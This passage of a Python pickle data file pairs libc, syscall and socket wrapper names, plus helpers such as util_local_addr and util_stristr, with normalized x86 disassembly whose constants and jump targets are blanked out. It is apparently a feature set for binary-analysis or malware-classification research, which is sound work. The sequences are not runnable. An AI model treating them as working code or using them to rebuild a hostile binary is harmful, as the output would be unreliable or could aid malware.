TEPTR[ESI]\nMOVSX~EAX,BL\nINC~ESI\nMOV~[ESP],EAX\nMOV~DL,[ESP]\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJBE~FOO\nLEA~EAX,[EDX-0]\nMOV~ECX,0\nCMP~AL,0\nJBE~FOO\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nMOV~CL,0\nLEA~ESI,[ESI+0]\nMOV~EDX,EBX\nSUB~EDX,ECX\nCMP~EDX,[ESP+0]\nJL~FOO\nTEST~EDI,EDI\nJS~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,EBP\nTEST~ECX,ECX\nJZ~FOO\nNEG~EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nCMP~EDX,[ESP+0]\nJLE~FOO\nOR~EDI,0\nJMP~FOO\nMOVSX~EBX,BYTEPTR[ESI]\nMOV~ECX,0\nINC~ESI\nMOVSX~EDX,BL\nMOV~[ESP+0],0\nMOV~[ESP],EDX\nJMP~FOO\nCMP~[ESP+0],0\nSBB~EAX,EAX\nADD~ESP,0\nSUB~EAX,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOVSX~EBX,BYTEPTR[ESI]\nINC~ESI\nMOVSX~EAX,BL\nMOV~[ESP],EAX\nJMP~FOO"'
p149
L284L
tp150
a(S'util_fdgets'
p151
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EBX,EBX\nMOV~ESI,[ESP+0]\nMOV~EBP,[ESP+0]\nMOV~EDI,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+EBX]\nPUSH~0\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nDEC~EAX\nJNZ~FOO\nINC~EBX\nCMP~EBP,EBX\nJLE~FOO\nCMP~[EBX+ESI-0],0\nJNZ~FOO\nTEST~EBX,EBX\nSETNZ~AL\nAND~EAX,0\nADD~ESP,0\nNEG~EAX\nAND~ESI,EAX\nPOP~EBX\nMOV~EAX,ESI\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p152
L76L
tp153
a(S'util_local_addr'
p154
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~[ESP+0],0\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ESI,EAX\nADD~ESP,0\nXOR~EAX,EAX\nCMP~ESI,0\nJZ~FOO\nLEA~EBX,[ESP+0]\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],ESI\nCALL~FOO\nMOV~EAX,[ESP+0]\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p155
L120L
tp156
a(S'util_stristr'
p157
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBP,[ESP+0]\nMOV~DWORDPTR[ESP],0\nCMP~[EBP+0],0\nJZ~FOO\nMOV~EBX,[ESP]\nINC~EBX\nMOV~[ESP],EBX\nMOV~EAX,[ESP]\nCMP~BYTEPTR[EAX+EBP],0\nJNZ~FOO\nMOV~EBX,[ESP+0]\nXOR~EDI,EDI\nMOV~ESI,[ESP+0]\nTEST~EBX,EBX\nJLE~FOO\nMOV~CL,[ESI]\nMOV~DL,[EBP+EDI+0]\nINC~ESI\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJA~FOO\nOR~ECX,0\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nOR~EDX,0\nCMP~CL,DL\nJZ~FOO\nXOR~EDI,EDI\nDEC~EBX\nTEST~EBX,EBX\nJG~FOO\nOR~EAX,0\nPOP~EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nINC~EDI\nCMP~[ESP],EDI\nJNZ~FOO\nMOV~EAX,ESI\nMOV~ECX,[ESP+0]\nSUB~EAX,ECX\nPOP~EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p158
L121L
tp159
a(S'util_strcmp'
p160
S'"PUSH~ESI\nPUSH~EBX\nMOV~EBX,[ESP+0]\nXOR~ESI,ESI\nMOV~ECX,[ESP+0]\nCMP~BYTEPTR[EBX],0\nJZ~FOO\nINC~ESI\nCMP~BYTEPTR[ESI+EBX],0\nJNZ~FOO\nXOR~EAX,EAX\nCMP~BYTEPTR[ECX],0\nJZ~FOO\nNOP\nINC~EAX\nCMP~BYTEPTR[EAX+ECX],0\nJNZ~FOO\nMOV~EDX,EAX\nCMP~ESI,EAX\nJZ~FOO\nXOR~EAX,EAX\nPOP~EBX\nPOP~ESI\nRETN\nINC~EBX\nINC~ECX\nDEC~EDX\nCMP~EDX,0\nJZ~FOO\nMOV~AL,[EBX]\nCMP~AL,[ECX]\nJZ~FOO\nJMP~FOO\nMOV~EAX,0\nPOP~EBX\nPOP~ESI\nRETN"'
p161
L74L
tp162
a(S'util_strncmp'
p163
S'"PUSH~ESI\nPUSH~EBX\nMOV~ECX,[ESP+0]\nXOR~EBX,EBX\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nCMP~BYTEPTR[ECX],0\nJZ~FOO\nINC~EBX\nCMP~BYTEPTR[EBX+ECX],0\nJNZ~FOO\nXOR~EAX,EAX\nCMP~BYTEPTR[EDX],0\nJZ~FOO\nINC~EAX\nCMP~BYTEPTR[EAX+EDX],0\nJNZ~FOO\nCMP~ESI,EBX\nJG~FOO\nCMP~ESI,EAX\nJLE~FOO\nXOR~EAX,EAX\nPOP~EBX\nPOP~ESI\nRETN\nINC~ECX\nINC~EDX\nDEC~ESI\nCMP~ESI,0\nJZ~FOO\nMOV~AL,[ECX]\nCMP~AL,[EDX]\nJZ~FOO\nJMP~FOO\nMOV~EAX,0\nJMP~FOO"'
p164
L78L
tp165
a(S'util_itoa'
p166
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nTEST~EDI,EDI\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nCMP~ESI,0\nJZ~FOO\nMOV~ECX,EAX\nXOR~EBP,EBP\nMOV~EBX,0\nXOR~EDX,EDX\nMOV~EAX,ECX\nDIV~,ESI\nCMP~EDX,0\nLEA~EAX,[EDX+0]\nJLE~FOO\nLEA~EAX,[EDX+0]\nMOV~[ESP+EBX+0],AL\nXOR~EDX,EDX\nMOV~EAX,ECX\nDEC~EBX\nDIV~,ESI\nMOV~ECX,EAX\nTEST~EAX,EAX\nJNZ~FOO\nTEST~EBP,EBP\nJNZ~FOO\nINC~EBX\nLEA~EAX,[ESP+EBX+0]\nCMP~BYTEPTR[EAX],0\nJZ~FOO\nXOR~ECX,ECX\nINC~ECX\nCMP~BYTEPTR[ECX+EAX],0\nJNZ~FOO\nCMP~ECX,0\nJZ~FOO\nMOV~EBX,EDI\nMOV~EDX,EAX\nMOV~AL,[EDX]\nDEC~ECX\nMOV~[EBX],AL\nINC~EDX\nINC~EBX\nCMP~ECX,0\nJNZ~FOO\nADD~ESP,0\nMOV~EAX,EDI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~BYTEPTR[EDI],0\nMOV~[EDI+0],0\nMOV~EAX,EDI\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nMOV~EBX,0\nMOV~[ESP+EBX+0],0\nJMP~FOO\nTEST~EAX,EAX\nJNS~FOO\nMOV~ECX,EAX\nNEG~ECX\nJZ~FOO\nMOV~EBP,0\nJMP~FOO\nMOV~EBX,EDI\nMOV~EDX,EAX\nXOR~ECX,ECX\nJMP~FOO"'
p167
L205L
tp168
a(S'fcntl'
p169
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDI,[ESP+0]\nLEA~EAX,[ECX-0]\nMOV~EDX,[ESP+0]\nCMP~EAX,0\nJA~FOO\nPUSH~EAX\nPUSH~EDX\nPUSH~ECX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~EDI\nRETN"'
p170
L87L
tp171
a(S'fcntl64'
p172
S'"PUSH~EDI\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nADD~ESP,0\nPOP~EDI\nRETN"'
p173
L63L
tp174
a(S'chdir'
p175
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p176
L46L
tp177
a(S'close'
p178
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p179
L46L
tp180
a(S'fork'
p181
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p182
L38L
tp183
a(S'getpid'
p184
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p185
L38L
tp186
a(S'getppid'
p187
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p188
L38L
tp189
a(S'ioctl'
p190
S'"PUSH~EDI\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nADD~ESP,0\nPOP~EDI\nRETN"'
p191
L63L
tp192
a(S'kill'
p193
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p194
L50L
tp195
a(S'open'
p196
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nTEST~CL,0\nJZ~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOVZX~EDX,AX\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~EDI\nRETN"'
p197
L75L
tp198
a(S'prctl'
p199
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p200
L63L
tp201
a(S'read'
p202
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p203
L54L
tp204
a(S'readlink'
p205
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p206
L54L
tp207
a(S'select'
p208
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p209
L63L
tp210
a(S'setsid'
p211
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p212
L38L
tp213
a(S'sigprocmask'
p214
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EDX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nCMP~EDI,0\nJBE~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nMOV~ESI,0\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p215
L85L
tp216
a(S'time'
p217
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p218
L46L
tp219
a(S'unlink'
p220
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p221
L46L
tp222
a(S'write'
p223
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p224
L54L
tp225
a(S'closedir'
p226
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nCMP~DWORDPTR[EDI],0\nJNZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nLEA~EBX,[EDI+0]\nPUSH~ESI\nPUSH~EBX\nPUSH~0\nLEA~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nMOV~EBX,[EDI]\nMOV~DWORDPTR[EDI],0\nPOP~EDX\nPOP~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nPOP~EAX\nPUSH~[EDI+0]\nCALL~FOO\nMOV~[ESP],EDI\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p227
L112L
tp228
a(S'opendir'
p229
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nXOR~EBX,EBX\nSUB~ESP,0\nPUSH~0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nTEST~EAX,EAX\nJS~FOO\nPUSH~EBX\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nCALL~FOO\nSUB~ESP,0\nMOV~EBX,EAX\nMOV~ESI,[EAX]\nPUSH~EDI\nCALL~FOO\nMOV~[EBX],ESI\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nTEST~EAX,EAX\nJZ~FOO\nMOV~[EAX],EDI\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~[EAX+0],0\nMOV~EAX,[ESP+0]\nMOV~[EBX+0],EAX\nCMP~EAX,0\nJA~FOO\nMOV~[EBX+0],0\nPUSH~EDX\nPUSH~EDX\nPUSH~[EBX+0]\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+0],EAX\nTEST~EAX,EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nXOR~EBX,EBX\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nMOV~EAX,EBX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p230
L241L
tp231
a(S'readdir'
p232
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nLEA~EBX,[ESI+0]\nPUSH~EBX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESI+0]\nCMP~EAX,[ESI+0]\nJA~FOO\nPUSH~EDX\nPUSH~[ESI+0]\nPUSH~[ESI+0]\nPUSH~DWORDPTR[ESI]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJG~FOO\nXOR~EBX,EBX\nJMP~FOO\nMOV~[ESI+0],EAX\nMOV~[ESI+0],0\nMOV~EAX,[ESI+0]\nMOV~EBX,EAX\nADD~EBX,[ESI+0]\nMOVZX~EDX,[EBX+0]\nADD~EAX,EDX\nMOV~[ESI+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[ESI+0],EAX\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p233
L132L
tp234
a(S'clock'
p235
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nADD~EAX,[ESP+0]\nADD~ESP,0\nIMUL~EAX,,0\nAND~EAX,0\nRETN"'
p236
L36L
tp237
a(S'memmove'
p238
S'"PUSH~EDI\nPUSH~ESI\nMOV~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~ECX,[ESP+0]\nCMP~EAX,ESI\nJNB~FOO\nMOV~EDI,EAX\nMOVSB~,\nJMP~FOO\nLEA~ESI,[ESI+ECX-0]\nLEA~EDI,[EAX+ECX-0]\nSTD\nMOVSB~,\nCLD\nPOP~ESI\nPOP~EDI\nRETN"'
p239
L39L
tp240
a(S'memset'
p241
S'"PUSH~EDI\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~EDI,[ESP+0]\nSTOSB~,\nMOV~EAX,[ESP+0]\nPOP~EDI\nRETN"'
p242
L21L
tp243
a(S'inet_addr'
p244
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nOR~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,EDX\nADD~ESP,0\nRETN"'
p245
L37L
tp246
a(S'accept'
p247
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p248
L43L
tp249
a(S'bind'
p250
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p251
L43L
tp252
a(S'connect'
p253
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p254
L43L
tp255
a(S'getsockname'
p256
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p257
L43L
tp258
a(S'getsockopt'
p259
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p260
L59L
tp261
a(S'listen'
p262
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p263
L35L
tp264
a(S'recv'
p265
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p266
L51L
tp267
a(S'recvfrom'
p268
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p269
L67L
tp270
a(S'send'
p271
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p272
L51L
tp273
a(S'sendto'
p274
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p275
L67L
tp276
a(S'setsockopt'
p277
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p278
L59L
tp279
a(S'socket'
p280
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nRETN"'
p281
L43L
tp282
a(S'raise'
p283
S'"SUB~ESP,0\nCALL~FOO\nPUSH~EDX\nPUSH~EDX\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nRETN"'
p284
L24L
tp285
a(S'sigaddset'
p286
S'"SUB~ESP,0\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJLE~FOO\nCMP~EAX,0\nJG~FOO\nADD~ESP,0\nJMP~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nADD~ESP,0\nRETN"'
p287
L42L
tp288
